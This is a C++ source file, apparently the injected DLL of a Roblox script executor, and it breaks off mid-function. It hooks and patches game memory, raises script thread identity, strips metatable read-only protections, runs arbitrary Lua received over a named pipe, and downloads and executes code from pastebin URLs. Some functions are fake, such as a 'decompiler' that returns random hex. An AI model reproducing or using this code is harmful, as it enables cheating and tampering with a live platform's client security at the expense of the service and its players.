#include "curl/curl.h"
#include "LuaWrapper.h"
#include <string>
#include <iostream>
#include <stdlib.h>
#include <vector>
#include "ConsoleCol.h"
#include <iterator>
#include <fstream>
#include <intrin.h>
#include <Tlhelp32.h>
#include <CommCtrl.h>
#include <fstream>
#include <sstream>
#include <Psapi.h>
#include "Base64.h"
#include <stdint.h>
#include "InternalUI.h"
#include <memory>
#include "Utilities.h"
#include "Bit.h"
#include "MouseLib.h"
#include "sha.h"
#include "Offsets.h"
DWORD ScriptContextVFT_Addy = x(0x1C0D8A0);
bool READY = false;
using namespace std;
void WrapG(DWORD rL, lua_State* L, const char* s)
{
	r_lua_getglobal(rL, s);
	Wrapper::Wrap(rL, L, -1);
	lua_setglobal(L, s);
	r_lua_pop(rL, 1);
	cout << s << endl;
}

void WrapAllGlobals(DWORD RLS, lua_State* LS) {
	r_lua_pushvalue(RLS, LUA_GLOBALSINDEX);
	r_lua_pushnil(RLS);
	while (r_lua_next(RLS, -2)) {
		const char* s = r_lua_tostring(RLS, -2);
		if (s != NULL && r_lua_type(RLS, -1) != R_LUA_TNIL) {
			std::cout << "Global: " << s << " Type: " << r_lua_type(RLS, -1) << std::endl;
			Wrapper::Wrap(RLS, LS, -1);
			lua_setglobal(LS, s);
			r_lua_pop(RLS, 1);
		}
		else {
			r_lua_pop(RLS, 1);
		}
	}
	r_lua_pop(RLS, 1);
}

static int CopyString(lua_State* L) {
	const char* str = lua_tostring(L, -1);
	int len = strlen(str);
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len + 1);
	void* mem_ptr = GlobalLock(hMem);
	memcpy(mem_ptr, str, len + 1);
	GlobalUnlock(hMem);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	CloseClipboard();
	return 0;
}

std::string Rend(int length) {
	std::string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string ppj;
	int pos = 0;
	while (pos != length) {
		int ppk = ((rand() % (str.size() - 1)));
		ppj = ppj + str[ppk];
		pos += 1;
	}
	return ppj.c_str();
}

#include "sha.h"
#include "Base64.h"
#include "XorS.h"
#include "md5.h"

namespace _env
{
	enum SingletonIndex
	{
		print = 0,
		info = 1,
		warn = 2,
		error = 3
	};

	std::int16_t SetContextLevel(int context_level)
	{
		
		return NULL;
	}

	void ExecuteScript(const char* script)
	{
		std::string buf;
		std::string newl = "\n";
		std::string random = Rend(10);

		buf.append(R"(
spawn(function() 
script=Instance.new('LocalScript') 
script.Parent=nil 

local ServerSide_Token = "X_XXAHRPPARPPRXHPHHPER"
--server.push(ServerSide_Token, "ServerScriptStorage")
)");
		buf.append(script);
		buf.append("\r\nend)");
		//std::cout << igreen << buf.c_str() << endl;
		if (luaL_loadbuffer(LS, buf.c_str(), buf.size(), "@iYobel")) {
			//r_lua_singleton(error, lua_tostring(LS, -1));
		}
		else {
			lua_pcall(LS, 0, 0, 0);
		}
	}

}

DWORD WINAPI LuaPipe(PVOID lvpParameter)
{
	string _pipe = "";
	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	XorS(a1, "\\\\.\\pipe\\e2bevibin");
	hPipe = CreateNamedPipe(TEXT(a1.decrypt()),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				try {
					try {
						_pipe = _pipe + buffer;
					}
					catch (...) {
					}
				}
				catch (std::exception e) {

				}
				catch (...) {

				}
			}
			_env::ExecuteScript(_pipe.c_str());
			_pipe = "";
		}
		DisconnectNamedPipe(hPipe);
	}
}

static int custom_getgenv(lua_State* L) {
	lua_pushvalue(LS, LUA_GLOBALSINDEX);
	lua_xmove(LS, L, 1);
	return 1;
}

int newindex_metamethod(lua_State* L) {
	DWORD rL = r_lua_newthread(RLS);
	Wrapper::UnWrap(L, rL, lua_upvalueindex(1));
	const char* key = lua_tostring(L, 2);
	r_lua_getmetatable(rL, -1);
	DWORD top = *(DWORD*)lua_index2adr(L, -1);
	*(BYTE*)(*(DWORD*)(top + 8));
	lua_pushvalue(L, lua_upvalueindex(1));
	Wrapper::UnWrap(L, rL, 3); r_lua_setfield(rL, -2, key);
	r_lua_setmetatable(rL, -2); lua_settop(L, 0);
	r_lua_pop(rL, 2);
	return 0;
}

int setidentity(lua_State* L) {
	int unk[] = { NULL, NULL };
	int level = lua_tonumber(L, -1);
	SandBoxThread(RLS, level, (int)unk);
	return 0;
}

static int custom_getrawmetatable(lua_State* L) {
	Wrapper::UnWrap(L, RLS, 1);
	if (r_lua_getmetatable(RLS, -1)) {
		DWORD top = *(DWORD*)lua_index2adr(L, -1);
		*(BYTE*)(*(DWORD*)(top + 8) = 0);
		Wrapper::Wrap(RLS, L, -1);
		lua_createtable(L, 0, 0);
		{
			lua_pushvalue(L, 1);
			lua_pushcclosure(L, newindex_metamethod, 1);
			lua_setfield(L, -2, "__newindex"); }
	}
	lua_setmetatable(L, -2);
	return 1;
}

int set_thread_identity(lua_State* L) {
	int sc[] = { NULL, NULL };
	SandBoxThread(RLS, lua_tonumber(L, 1), (int)sc);
	return 0;
}

int get_thread_identity(lua_State* L) {
	lua_pushnumber(L, *reinterpret_cast<int*>(*reinterpret_cast<int*>(RLS + 128) + 24));
	return 0;
}

int setreadonly(lua_State* thread) {
	Wrapper::UnWrap(thread, RLS, -2);
	*(BYTE*)(*(DWORD*)lua_index2adr(thread, -1) + 7) = lua_toboolean(thread, -1);
	Wrapper::Wrap(RLS, thread, -1);
	return 0;
}

int custom_isreadonly(lua_State* LuaState) {
	int value = *(BYTE*)(*(DWORD*)lua_index2adr(LuaState, -1) + 8);
	if (value == 1) {
		lua_pushboolean(LuaState, true);
	}
	else if (value == 0) {
		lua_pushboolean(LuaState, false);
	}
	return 1;
}

void ConsoleBypass(const char* Name)
{
	DWORD AAAAAAAAAAAAAAA;
	VirtualProtect((PVOID)& FreeConsole, 1, PAGE_EXECUTE_READWRITE, &AAAAAAAAAAAAAAA);
	*(BYTE*)(&FreeConsole) = 0xC3;
	AllocConsole();
	SetConsoleTitleA(Name);
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
	HWND ConsoleHandle = GetConsoleWindow();
	::SetWindowPos(ConsoleHandle, HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
	::ShowWindow(ConsoleHandle, SW_NORMAL);
}





void* placeHook(DWORD address, void* hook, bool revert = false) {
	DWORD oldprot;
	if (!revert) {
		void* oldmem = new void*;
		void* result = new void*;
		memcpy(oldmem, (void*)address, sizeof(void*) * 4);
		VirtualProtect((LPVOID)address, 1, PAGE_EXECUTE_READWRITE, &oldprot);
		*(char*)address = 0xE9; *(DWORD*)(address + 1) = (DWORD)hook - address - 5;
		memcpy(result, oldmem, sizeof(void*) * 4);
		VirtualProtect((LPVOID)address, 1, oldprot, &oldprot);
		return result;
	}
	else {
		VirtualProtect((LPVOID)address, 1, PAGE_EXECUTE_READWRITE, &oldprot);
		memcpy((void*)address, hook, sizeof(void*) * 4);
		VirtualProtect((LPVOID)address, 1, oldprot, &oldprot);
		return NULL;
	}
}


int gettop_d(int a1)
{
	RLS = a1;
	return (*(DWORD*)(a1 + top) - *(DWORD*)(a1 + base)) >> 4;
}

int gethpath(lua_State* L) {
	char path[MAX_PATH];
	Files::GetFile("module", "", path, MAX_PATH);
	std::cout << path << "\n";
	lua_pushstring(L, path);
	return 1;
}

int writefile(lua_State* L) {
	if (lua_gettop(L) < 2) { printf("writefile expects 2 arguments."); return 0; }
	std::string _path = (std::string)lua_tostring(L, 1);
	const char* plswrite = lua_tostring(L, 2);
	if (strlen(_path.c_str()) >= 50) {
		std::string path2backup = _path;
		_path = (std::string)plswrite;
		plswrite = path2backup.c_str();
	}
	char dog[MAX_PATH];
	Files::GetFile("module.dll", "", dog, MAX_PATH);
	char pls1[100];   // array to hold the result.
	strcpy(pls1, dog); // copy string one into the result.
	strcat(pls1, "workspace\\");
	char path[100];   // array to hold the result.
	strcpy(path, pls1); // copy string one into the result.
	strcat(path, _path.c_str());
	std::string _checkPath(path);
	/*if (_checkPath.find(".exe") || _checkPath.find(".dll")) {
		printf("Attempt to writefile to a blocked file extension.");
		return 0;
	}*/
	if (!Files::WriteFile(path, plswrite, false)) {
		return 0;
	}
	return 0;
} //i like taking bytecode funcs and using them here

int readfile(lua_State* L) {
	std::string _path = (std::string)lua_tostring(L, 1);
	gethpath(L); // TODO FIX 
	std::string ok = (std::string)lua_tostring(L, -1);
	char pls1[100];   // array to hold the result.
	strcpy(pls1, ok.c_str()); // copy string one into the result.
	strcat(pls1, "Workspace\\");
	char path[100];   // array to hold the result.
	strcpy(path, pls1); // copy string one into the result.
	strcat(path, _path.c_str());
	std::string _checkFile(path);
	std::string filecontents;
	if (!Files::ReadFile(path, filecontents, 0)) {
		r_lua_pushnil(RLS);
		//printf("Failed to read file.");
		return 1;
	}
	lua_pushstring(L, filecontents.c_str());
	return 1;
}

std::string randomstringg2(int length) {
	std::string str = "000000000123456666666666666789EFC";
	std::string ppj;
	int pos = 0;
	while (pos != length) {
		int ppk = ((rand() % (str.size() - 1)));
		ppj = ppj + str[ppk];
		pos += 1;
	}
	return ppj.c_str();
}

static int LuaU_decompile(lua_State* ring)
{
	string x;
	int i = 0;

	for (i = 1; i <= 6; i++)
	{
		x.append(randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + randomstringg2(2) + " " + "\n");
	}

	lua_pushstring(ring, x.c_str());
	return 1;
}
namespace Memory {
	BOOL compare(const BYTE* location, const BYTE* aob, const char* mask) {
		for (; *mask; ++aob, ++mask, ++location) {
			__try {
				if (*mask == 'x' && *location != *aob)
					return 0;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				return 0;
			}
		}
		return 1;
	}

	DWORD find_Pattern(DWORD size, BYTE* pattern, char* mask,
		BYTE protection = (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) {
		SYSTEM_INFO SI = { 0 };
		GetSystemInfo(&SI);
		DWORD start = (DWORD)SI.lpMinimumApplicationAddress;
		DWORD end = (DWORD)SI.lpMaximumApplicationAddress;
		MEMORY_BASIC_INFORMATION mbi;
		while (start < end && VirtualQuery((void*)start, &mbi, sizeof(mbi))) {
			// Make sure the memory is committed, matches our protection, and isn't PAGE_GUARD.
			if ((mbi.State & MEM_COMMIT) && (mbi.Protect & protection) && !(mbi.Protect & PAGE_GUARD)) {
				// Scan all the memory in the region.
				for (DWORD i = (DWORD)mbi.BaseAddress; i < (DWORD)mbi.BaseAddress + mbi.RegionSize; ++i) {
					if (compare((BYTE*)i, pattern, mask)) {
						return i;
					}
				}
			}
			// Move onto the next region of memory.
			start += mbi.RegionSize;
		}
		return 0;
	}

	int Scan(DWORD mode, char* content, char* mask) {
		return find_Pattern(0x7FFFFFFF, (BYTE*)content, mask, mode);
	}
}



typedef struct LuaU_Reg {
	const char* name;
	lua_CFunction func;
} LuaU_Reg;

static const luaL_Reg CustomFunctions[] = {
  {"assert", setreadonly},
  {NULL, NULL}
};

int getsenv(lua_State* LS) {
	lua_pushvalue(LS, LUA_ENVIRONINDEX);
	Wrapper::Wrap(RLS, LS, -1);
	return 1;
}

int getreg(lua_State* L) {
	lua_pushvalue(L, LUA_REGISTRYINDEX);
	return 1;
}

int getrenv(lua_State* L) {
	r_lua_pushvalue(RLS, int(RLS));
	Wrapper::Wrap(RLS, L, -1);
	return 1;
}

static int custom_require(lua_State* L) {
	int sc[] = { NULL, NULL };
	SandBoxThread(RLS, 2, (int)sc);
	Sleep(200);
	SandBoxThread(RLS, 6, (int)sc);
	return 1;
}

bool checksignal(lua_State* RL, int Index)
{
	lua_getglobal(RL, "typeof");
	lua_pushvalue(RL, Index);
	lua_pcall(RL, 1, 1, 0);
	const auto Check = lua_tostring(RL, -1);
	lua_pop(RL, 1);
	return !strcmp(Check, "RBXScriptSignal");
}

int getconnections(lua_State* L) {

	if (!lua_isuserdata(L, 1) || !checksignal(L, 1))
		return luaL_argerror(L, 1, "signal expected");
	const auto EventInstance = *reinterpret_cast<std::uintptr_t*>(lua_touserdata(L, 1));
	const auto Source = reinterpret_cast<std::weak_ptr<uintptr_t>*>(EventInstance + 4)->lock();
	const auto Signal = reinterpret_cast<uintptr_t(__thiscall*)(uintptr_t*, bool)>(*reinterpret_cast<std::uintptr_t*>(EventInstance + 48))(Source.get(), true);
	return 1;
}

int GetConnectionTR(lua_State* L, DWORD Conn) {
	DWORD Ret = 0;
	if (*(DWORD*)(Conn + 0x1C) == 0)
		Ret = *(DWORD*)(Conn + 0x20);
	else if (*(DWORD*)(Conn + 0x14) == 0)
		Ret = *(DWORD*)(Conn + 0x18);
	if (!Ret)
		return luaL_error(L, "internal error [0x01]");
	return Ret;
}

int getconnectionfunc(lua_State* L) {
	if (!lua_isuserdata(L, 1))
		return luaL_argerror(L, 1, "synapse signal expected");
	DWORD Conn = (DWORD)lua_touserdata(L, 1);
	DWORD TR = GetConnectionTR(L, Conn);
	DWORD NRL = *(DWORD*)(*(DWORD*)(TR + 0x38) + 0x8);
	DWORD Idx = *(DWORD*)(TR + 0x40);
	lua_pushinteger(LS, Idx);
	lua_gettable(LS, LUA_REGISTRYINDEX);
	lua_xmove(LS, L, 1);
	return 1;
}

int getconnectionstate(lua_State* L)
{
	if (!lua_isuserdata(L, 1))
		return luaL_argerror(L, 1, "synapse signal expected");
	DWORD Conn = (DWORD)lua_touserdata(L, 1);
	DWORD TR = GetConnectionTR(L, Conn);
	DWORD NRL = *(DWORD*)(*(DWORD*)(TR + 0x38) + 0x8);
	lua_pushlightuserdata(L, (void*)NRL);
	return 1;
}

int custom_loadstring(lua_State* L) {
	if (lua_type(L, -1) != LUA_TSTRING) {
		luaL_error(L, "First arg is a string");
		return 1;
	}
	if (lua_gettop(L) == 0) {
		luaL_error(L, "just one arg needed");
		return 1;
	}
	string buf = lua_tostring(L, -1);
	luaL_dostring(L, buf.c_str());
	/*if (luaL_loadbuffer(LS, buf.c_str(), buf.size(), "@YungCindyy")) {
		std::cout << ired << "LUA_ERROR : " << white << lua_tostring(LS, -1) << "\n";
		lua_pop(LS, 1);
		return 1;
	}
	else {
		lua_pcall(LS, 0, LUA_MULTRET, 0);
		return 1;
	}*/
	return 1;
}

int getfenv(lua_State* m_L) {
	lua_pushvalue(LS, LUA_GLOBALSINDEX);
	lua_xmove(LS, m_L, 1);
	return 1;
}



static int CheckCaller(lua_State* LS)
{
	lua_pushboolean(LS, true);
	return 1;
}

int islclosure(lua_State* L)
{
	luaL_checktype(L, 1, R_LUA_TFUNCTION);
	lua_pushboolean(L, !lua_iscfunction(L, 1));
	return 1;
}


static int luaU_loadstring(lua_State* L) {
	luaL_loadstring(LS, lua_tostring(LS, -1));
	return 1;
}



inline std::string download_url(const std::string& url) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	std::string rtn;

	if (interwebs) {
		HINTERNET url_file = InternetOpenUrlA(interwebs, url.c_str(), NULL, NULL, NULL, NULL);

		if (url_file) {
			char buffer[2000];
			DWORD bytes_read;

			do {
				InternetReadFile(url_file, buffer, 2000, &bytes_read);
				rtn.append(buffer, bytes_read);
				memset(buffer, 0, 2000);
			} while (bytes_read);

			InternetCloseHandle(interwebs);
			InternetCloseHandle(url_file);
			std::string p = replace_all1(rtn, "|n", "\r\n");
			return p;
		}
	}

	InternetCloseHandle(interwebs);
	std::string p = replace_all1(rtn, "|n", "\r\n");
	return p;
}

static int custom_LoadLibrary(lua_State* LS)
{
	auto lib = lua_tostring(LS, -1);

	if (lib == "RbxGui")
	{
		luaL_dostring(LS, download_url("https://pastebin.com/raw/LqTVquRt").c_str());
	}
	else if (lib == "RbxUtility")
	{
		luaL_dostring(LS, download_url("https://pastebin.com/raw/nEYLx4u8").c_str());
	}
	else if (lib == "RbxStamper")
	{
		luaL_dostring(LS, download_url("https://pastebin.com/raw/g88VeC0V").c_str());
	}
	else
	{
		//ExecuteScript2("warn('Library returned: nil')");
	}
	return 1;
}

int Debug_SetMetaTable(lua_State* L) {
	if (lua_gettop(L) == 0) {
		luaL_error(L, "'debug.setmetatable' needs at least 1 argument.");
		return 0;
	}
	r_lua_pushboolean(RLS, lua_setmetatable(L, 1));
	return 1;
}

int SetRawMetaTable(lua_State* L) {
	Wrapper::UnWrap(L, RLS, 1);

	if (r_lua_setmetatable(RLS, -1) == 0) {
		lua_pushnil(L);
		return 0;
	}
	Wrapper::Wrap(RLS, L, -1);

	return 1;
}

static void settabss(lua_State* L, const char* i, const char* v) {
	lua_pushstring(L, v);
	lua_setfield(L, -2, i);
}


static void settabsi(lua_State* L, const char* i, int v) {
	lua_pushinteger(L, v);
	lua_setfield(L, -2, i);
}

#define LEVELS1	12	/* size of the first part of the stack */
#define LEVELS2	10	/* size of the second part of the stack */

static void treatstackoption(lua_State * L, lua_State * L1, const char* fname) {
	if (L == L1) {
		lua_pushvalue(L, -2);
		lua_remove(L, -3);
	}
	else
		lua_xmove(L1, L, 1);
	lua_setfield(L, -2, fname);
}

static lua_State* getthread(lua_State* L, int* arg) {
	if (lua_isthread(L, 1)) {
		*arg = 1;
		return lua_tothread(L, 1);
	}
	else {
		*arg = 0;
		return L;
	}
}

static int serverPush(lua_State* LS)
{
	if (r_lua_gettop(-1) != R_LUA_TSTRING && r_lua_gettop(-2) != R_LUA_TSTRING)
	{
		luaL_error(LS, "Expected string as both arguments..");
	}
	else
	{
		DWORD ServerState = 0xF3592F;
		*(DWORD*)ServerState = 2;
		ServerState += 172 - *(uintptr_t*)ServerState;
	}
	return 1;
}

static int Debug_getinfo(lua_State* L) {
	lua_Debug ar;
	int arg;
	lua_State* L1 = getthread(L, &arg);
	const char* options = luaL_optstring(L, arg + 2, "flnSu");
	if (lua_isnumber(L, arg + 1)) {
		if (!lua_getstack(L1, (int)lua_tointeger(L, arg + 1), &ar)) {
			lua_pushnil(L);  /* level out of range */
			return 1;
		}
	}
	else if (lua_isfunction(L, arg + 1)) {
		lua_pushfstring(L, ">%s", options);
		options = lua_tostring(L, -1);
		lua_pushvalue(L, arg + 1);
		lua_xmove(L, L1, 1);
	}
	else
		return luaL_argerror(L, arg + 1, "function or level expected");
	if (!lua_getinfo(L1, options, &ar))
		return luaL_argerror(L, arg + 2, "invalid option");
	lua_createtable(L, 0, 2);
	if (strchr(options, 'S')) {
		settabss(L, "source", ar.source);
		settabss(L, "short_src", ar.short_src);
		settabsi(L, "linedefined", ar.linedefined);
		settabsi(L, "lastlinedefined", ar.lastlinedefined);
		settabss(L, "what", ar.what);
	}
	if (strchr(options, 'l'))
		settabsi(L, "currentline", ar.currentline);
	if (strchr(options, 'u'))
		settabsi(L, "nups", ar.nups);
	if (strchr(options, 'n')) {
		settabss(L, "name", ar.name);
		settabss(L, "namewhat", ar.namewhat);
	}
	if (strchr(options, 'L'))
		treatstackoption(L, L1, "activelines");
	if (strchr(options, 'f'))
		treatstackoption(L, L1, "func");
	return 1;  /* return table */
}


static int Debug_getlocal(lua_State* L) {
	int arg;
	lua_State* L1 = getthread(L, &arg);
	lua_Debug ar;
	const char* name;
	if (!lua_getstack(L1, luaL_checkint(L, arg + 1), &ar))  /* out of range? */
		return luaL_argerror(L, arg + 1, "level out of range");
	name = lua_getlocal(L1, &ar, luaL_checkint(L, arg + 2));
	if (name) {
		lua_xmove(L1, L, 1);
		lua_pushstring(L, name);
		lua_pushvalue(L, -2);
		return 2;
	}
	else {
		lua_pushnil(L);
		return 1;
	}
}


static int Debug_setlocal(lua_State* L) {
	int arg;
	lua_State* L1 = getthread(L, &arg);
	lua_Debug ar;
	if (!lua_getstack(L1, luaL_checkint(L, arg + 1), &ar))  /* out of range? */
		return luaL_argerror(L, arg + 1, "level out of range");
	luaL_checkany(L, arg + 3);
	lua_settop(L, arg + 3);
	lua_xmove(L, L1, 1);
	lua_pushstring(L, lua_setlocal(L1, &ar, luaL_checkint(L, arg + 2)));
	return 1;
}


static int auxupvalue(lua_State* L, int get) {
	const char* name;
	int n = luaL_checkint(L, 2);
	luaL_checktype(L, 1, LUA_TFUNCTION);
	if (lua_iscfunction(L, 1)) return 0;  /* cannot touch C upvalues from Lua */
	name = get ? lua_getupvalue(L, 1, n) : lua_setupvalue(L, 1, n);
	if (name == NULL) return 0;
	lua_pushstring(L, name);
	lua_insert(L, -(get + 1));
	return get + 1;
}


static int Debug_getupvalue(lua_State* L) {
	return auxupvalue(L, 1);
}


static int Debug_setupvalue(lua_State* L) {
	luaL_checkany(L, 3);
	return auxupvalue(L, 0);
}

static int Debug_traceback(lua_State* L) {
	int level;
	int firstpart = 1;  /* still before eventual `...' */
	int arg;
	lua_State* L1 = getthread(L, &arg);
	lua_Debug ar;
	if (lua_isnumber(L, arg + 2)) {
		level = (int)lua_tointeger(L, arg + 2);
		lua_pop(L, 1);
	}
	else
		level = (L == L1) ? 1 : 0;  /* level 0 may be this own function */
	if (lua_gettop(L) == arg)
		lua_pushliteral(L, "");
	else if (!lua_isstring(L, arg + 1)) return 1;  /* message is not a string */
	else lua_pushliteral(L, "\n");
	lua_pushliteral(L, "stack traceback:");
	while (lua_getstack(L1, level++, &ar)) {
		if (level > LEVELS1 && firstpart) {
			/* no more than `LEVELS2' more levels? */
			if (!lua_getstack(L1, level + LEVELS2, &ar))
				level--;  /* keep going */
			else {
				lua_pushliteral(L, "\n\t...");  /* too many levels */
				while (lua_getstack(L1, level + LEVELS2, &ar))  /* find last levels */
					level++;
			}
			firstpart = 0;
			continue;
		}
		lua_pushliteral(L, "\n\t");
		lua_getinfo(L1, "Snl", &ar);
		lua_pushfstring(L, "%s:", ar.short_src);
		if (ar.currentline > 0)
			lua_pushfstring(L, "%d:", ar.currentline);
		if (*ar.namewhat != '\0')  /* is there a name? */
			lua_pushfstring(L, " in function " LUA_QS, ar.name);
		else {
			if (*ar.what == 'm')  /* main? */
				lua_pushfstring(L, " in main chunk");
			else if (*ar.what == 'C' || *ar.what == 't')
				lua_pushliteral(L, " ?");  /* C function or tail call */
			else
				lua_pushfstring(L, " in function <%s:%d>",
					ar.short_src, ar.linedefined);
		}
		lua_concat(L, lua_gettop(L) - arg);
	}
	lua_concat(L, lua_gettop(L) - arg);
	return 1;
}

static int Debug_setfenv(lua_State* L) {
	luaL_checktype(L, 2, LUA_TTABLE);
	lua_settop(L, 2);
	if (lua_setfenv(L, 1) == 0)
		luaL_error(L, LUA_QL("setfenv")
			" cannot change environment of given object");
	return 1;
}

int Debug_GetMetaTable(lua_State* L) {
	if (lua_gettop(L) == 0) {
		luaL_error(L, "'debug.getrawmetatable' needs 1 argument.");
		return 0;
	}
	Wrapper::Wrap(RLS, L, 1);
	if (r_lua_getmetatable(RLS, -1) == 0) {
		lua_pushnil(L);
		return 0;
	}
	Wrapper::UnWrap(L, RLS, -1);
	return 1;
}

int Debug_GetRegistry(lua_State* L) {
	r_lua_pushvalue(RLS, LUA_REGISTRYINDEX);
	return 1;
}

static int GetUpValues(lua_State* L) {
	if (lua_gettop(L) < 1) return luaL_error(L, "getupvalues requires 1 argument!");
	int Size;
	TValue* Obj = lua_index2adr(L, 1);
	if (Obj->tt != LUA_TFUNCTION) return luaL_error(L, "#1 argument must be function!");
	Closure* f = clvalue(Obj);
	if (f->c.isC) Size = f->c.nupvalues; else Size = f->l.p->sizeupvalues;
	if (Size) {
		lua_newtable(L);
		for (int i = 1; i <= Size; ++i) {
			const char* Name = lua_getupvalue(L, 1, i);
			lua_setfield(L, -2, Name);
		}
	}
	return 1;
}

void GetFile(const char* dllName, const char* fileName, char* buffer, int bfSize) {
	GetModuleFileName(GetModuleHandle(dllName), buffer, bfSize);
	if (strlen(fileName) + strlen(buffer) < MAX_PATH) {
		char* pathEnd = strrchr(buffer, '\\');
		strcpy(pathEnd + 1, fileName);
	}
	else {
		*buffer = 0;
	}
}


void get_fil1e(const char* dllName, const char* fileName, char* buffer, int bfSize) {
	GetModuleFileName(GetModuleHandle(dllName), buffer, bfSize);
	if (strlen(fileName) + strlen(buffer) < MAX_PATH) {
		char* pathEnd = strrchr(buffer, '\\');
		strcpy(pathEnd + 1, fileName);
	}
	else {
		*buffer = 0;
	}
}

#define AS_DLL "module.dll"

static int custom_readfile(lua_State* L) {
	const char* name = lua_tolstring(L, -1, 0);
	char path[MAX_PATH];
	get_fil1e(AS_DLL, "", path, MAX_PATH);
	std::string file;
	file += path;
	file += "workspace\\";
	file += name;
	std::string line;
	std::ifstream swfile(file);
	string cache;
	if (swfile.is_open())
	{
		while (getline(swfile, line))
		{
			cache.append(line.c_str());
			cache.append("\n");
		}
		lua_pushstring(L, cache.c_str());
		swfile.close();
	}
	return 1;
}

static int custom_runfile(lua_State* L) {
	const char* name = lua_tolstring(L, -1, 0);
	char path[MAX_PATH];
	get_fil1e(AS_DLL, "", path, MAX_PATH);
	std::string file;
	file += path;
	file += "workspace\\";
	file += name;
	std::string line;
	std::ifstream swfile(file);
	string cache;
	if (swfile.is_open())
	{
		while (getline(swfile, line))
		{
			cache.append(line.c_str());
			cache.append("\n");
		}
		_env::ExecuteScript(cache.c_str());
		swfile.close();
	}
	return 1;
}

static int custom_autorun(lua_State* L) {
	const char* name = lua_tolstring(L, -1, 0);
	char path[MAX_PATH];
	get_fil1e(AS_DLL, "", path, MAX_PATH);
	std::string file;
	file += path;
	file += "autorun\\";
	file += name;
	std::string line;
	std::ifstream swfile(file);
	string cache;
	if (swfile.is_open())
	{
		while (getline(swfile, line))
		{
			cache.append(line.c_str());
			cache.append("\n");
		}
		_env::ExecuteScript(cache.c_str());
		swfile.close();
	}
	return 1;
}


static int custom_writefile(lua_State* L) {
	const char* name = lua_tolstring(L, -1, 0);
	const char* stuff = lua_tolstring(L, -2, 0);
	char path[MAX_PATH];
	get_fil1e(AS_DLL, "", path, MAX_PATH);
	std::string file;
	file += path;
	file += "workspace\\";
	file += stuff;
	std::ofstream createfile(file.c_str());
	createfile << name;
	return 0;
}

static int custom_dumpstring(lua_State* L)
{
	lua_getglobal(L, "string");
	lua_getfield(L, -1, "dump");
	lua_pushvalue(L, -3);
	lua_pcall(L, 1, 1, 0);
	lua_setglobal(L, "buffer");
	lua_pop(L, 1);

	lua_getglobal(L, "string");
	lua_getfield(L, -1, "len");
	lua_getglobal(L, "buffer");
	lua_pcall(L, 1, 1, 0);
	size_t size = lua_tointeger(L, -1);
	lua_pop(L, 1);
	printf("Size of buffer: %i.\n", size);

	lua_getglobal(L, "buffer");
	uint8_t* code = new uint8_t[size];
	memcpy(code, lua_tolstring(L, -1, &size), size);
	lua_pop(L, 1);
	lua_pushstring(L, (const char*)code);
}

static int _dumpstring(lua_State* L) {
	auto script = lua_tostring(L, -1);
	std::cout << (string)script << endl;
	auto hold = std::string("local _f = loadstring(" + std::string(script) + ")\nreturn string.dump(_f)");
	luaL_dostring(L, hold.c_str());
	return 1;
}

static int _dump(lua_State* L) {
	bool arg1 = lua_toboolean(L, -1);
	std::cout << arg1 << endl;
	if (arg1)
	{
		__dump = true;
	}
	else
	{
		__dump = false;
	}
	return 1;
}

vector<string> get_all_files_names_within_folder(string folder)
{
	vector<string> names;
	string search_path = folder + "/*.*";
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
